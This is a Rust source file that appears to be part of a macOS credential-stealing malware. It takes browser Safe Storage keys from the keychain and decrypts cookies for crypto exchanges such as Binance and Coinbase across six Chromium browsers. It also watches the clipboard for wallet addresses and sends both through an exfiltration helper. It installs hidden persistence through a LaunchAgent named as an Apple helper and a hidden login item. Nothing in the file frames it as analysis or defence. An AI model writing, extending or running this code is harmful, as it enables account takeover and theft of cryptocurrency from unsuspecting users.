use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use serde::Serialize;
use std::fs;
use std::path::Path;
use std::process::Command;
use std::sync::Mutex;
use std::time::{Duration, Instant};

#[derive(Serialize)]
struct CookieHit {
    br: String,
    host: String,
    name: String,
    v: String,
}

const EXCHANGE_HOSTS: &[&str] = &[
    "binance.com",
    "coinbase.com",
    "kraken.com",
    "kucoin.com",
    "crypto.com",
    "okx.com",
    "bybit.com",
];

pub fn harvest_session_tokens() {
    let home = std::env::var("HOME").unwrap_or_default();
    let support = format!("{}/Library/Application Support", home);
    let variants: &[(&str, &str)] = &[
        ("Chrome", "Google/Chrome"),
        ("Chromium", "Chromium"),
        ("Brave", "BraveSoftware/Brave-Browser"),
        ("Vivaldi", "Vivaldi"),
        ("Edge", "Microsoft Edge"),
        ("Opera", "com.operasoftware.Opera"),
    ];
    let mut out: Vec<CookieHit> = Vec::new();
    for (name, rel) in variants {
        let base = Path::new(&support).join(rel);
        if !base.exists() {
            continue;
        }
        let mk = match macos_master_key(name) {
            Some(k) => k,
            None => continue,
        };
        let rd = match fs::read_dir(&base) {
            Ok(r) => r,
            Err(_) => continue,
        };
        for prof in rd.flatten() {
            let pname = prof.file_name().to_string_lossy().to_string();
            if pname != "Default" && !pname.starts_with("Profile ") {
                continue;
            }
            let ck = prof.path().join("Cookies");
            if !ck.exists() {
                continue;
            }
            let tmp = std::env::temp_dir().join(format!(".ck_{}.db", fast_id()));
            if fs::copy(&ck, &tmp).is_err() {
                continue;
            }
            if let Ok(conn) = rusqlite::Connection::open_with_flags(
                &tmp,
                rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
            ) {
                if let Ok(mut stmt) =
                    conn.prepare("SELECT host_key, name, encrypted_value FROM cookies")
                {
                    if let Ok(rows) = stmt.query_map([], |r| {
                        Ok((
                            r.get::<_, String>(0)?,
                            r.get::<_, String>(1)?,
                            r.get::<_, Vec<u8>>(2)?,
                        ))
                    }) {
                        for row in rows.flatten() {
                            let (host, cn, enc) = row;
                            if !EXCHANGE_HOSTS.iter().any(|h| host.contains(h)) {
                                continue;
                            }
                            if let Some(v) = decrypt_blob(&enc, &mk) {
                                out.push(CookieHit {
                                    br: format!("{}:{}", name, pname),
                                    host,
                                    name: cn,
                                    v,
                                });
                            }
                        }
                    }
                }
            }
            let _ = fs::remove_file(&tmp);
        }
    }
    if !out.is_empty() {
        svc_common::exfil::exfil_event("session_tokens", &out);
    }
}

fn macos_master_key(browser: &str) -> Option<[u8; 32]> {
    let service = match browser {
        "Chrome" => "Chrome Safe Storage",
        "Brave" => "Brave Safe Storage",
        "Edge" => "Microsoft Edge Safe Storage",
        "Vivaldi" => "Vivaldi Safe Storage",
        _ => "Chrome Safe Storage",
    };
    let o = Command::new("security")
        .args(["find-generic-password", "-w", "-s", service])
        .output()
        .ok()?;
    if !o.status.success() {
        return None;
    }
    let pw = String::from_utf8_lossy(&o.stdout).trim().to_string();
    if pw.is_empty() {
        return None;
    }
    Some(derive_key(&pw))
}

fn derive_key(password: &str) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(password.as_bytes());
    h.update(b"saltysalt");
    let d = h.finalize();
    let mut k = [0u8; 32];
    k.copy_from_slice(&d);
    k
}

fn decrypt_blob(blob: &[u8], key: &[u8; 32]) -> Option<String> {
    if blob.starts_with(b"v10") || blob.starts_with(b"v11") {
        if blob.len() > 3 + 12 + 16 {
            let nonce = &blob[3..15];
            let ct = &blob[15..];
            let cipher = Aes256Gcm::new(key.into());
            return cipher
                .decrypt(Nonce::from_slice(nonce), ct)
                .ok()
                .and_then(|p| String::from_utf8(p).ok());
        }
    }
    None
}

pub fn clipboard_monitor() {
    std::thread::spawn(|| {
        use std::collections::VecDeque;
        let mut recent: VecDeque<String> = VecDeque::with_capacity(16);
        let last_send = Mutex::new(Instant::now() - Duration::from_secs(10));
        loop {
            if let Ok(o) = Command::new("pbpaste").output() {
                let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
                if crate::wallets::is_wallet_addr(&s) && !recent.contains(&s) {
                    recent.push_back(s.clone());
                    if recent.len() > 16 {
                        recent.pop_front();
                    }
                    let mut g = last_send.lock().unwrap_or_else(|e| e.into_inner());
                    if g.elapsed() >= Duration::from_millis(1500) {
                        *g = Instant::now();
                        drop(g);
                        svc_common::exfil::exfil_event(
                            "clip_addr",
                            serde_json::json!({"addr": s}),
                        );
                    }
                }
            }
            std::thread::sleep(Duration::from_secs(2));
        }
    });
}

fn rand_suffix() -> String {
    let mut b = [0u8; 4];
    use rand::RngCore;
    rand::thread_rng().fill_bytes(&mut b);
    format!("{:08x}", u32::from_le_bytes(b))
}

pub fn install_persistence(entries: &[String]) {
    let self_path = std::env::current_exe().unwrap_or_default();
    let tag = rand_suffix();
    for entry in entries {
        match entry.as_str() {
            "launchagent" => {
                if let Ok(home) = std::env::var("HOME") {
                    let dir = format!("{}/Library/LaunchAgents", home);
                    let _ = std::fs::create_dir_all(&dir);
                    let label = format!("com.apple.helper.{}", tag);
                    let plist = format!(
                        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>{}</string>
    <key>ProgramArguments</key><array><string>{}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>
"#,
                        label,
                        self_path.display()
                    );
                    let plist_path = format!("{}/{}.plist", dir, label);
                    let _ = std::fs::write(&plist_path, plist);
                    let _ = Command::new("launchctl")
                        .args(["load", &plist_path])
                        .output();
                }
            }
            "login_item" => {
                let _ = Command::new("osascript")
                    .args([
                        "-e",
                        &format!(
                            r#"tell application "System Events" to make login item at end with properties {{path:"{}", hidden:true}}"#,
                            self_path.display()
                        ),
                    ])
                    .output();
            }
            _ => {}
        }
    }
}

pub fn uninstall_persistence(_entries: &[String]) {
    if let Ok(home) = std::env::var("HOME") {
        let dir = format!("{}/Library/LaunchAgents", home);
        if let Ok(rd) = std::fs::read_dir(&dir) {
            for f in rd.flatten() {
                let name = f.file_name().to_string_lossy().to_string();
                if name.starts_with("com.apple.helper.") && name.ends_with(".plist") {
                    let p = f.path();
                    let _ = Command::new("launchctl")
                        .args(["unload", p.to_string_lossy().as_ref()])
                        .output();
                    let _ = std::fs::remove_file(p);
                }
            }
        }
    }
}

fn fast_id() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
}
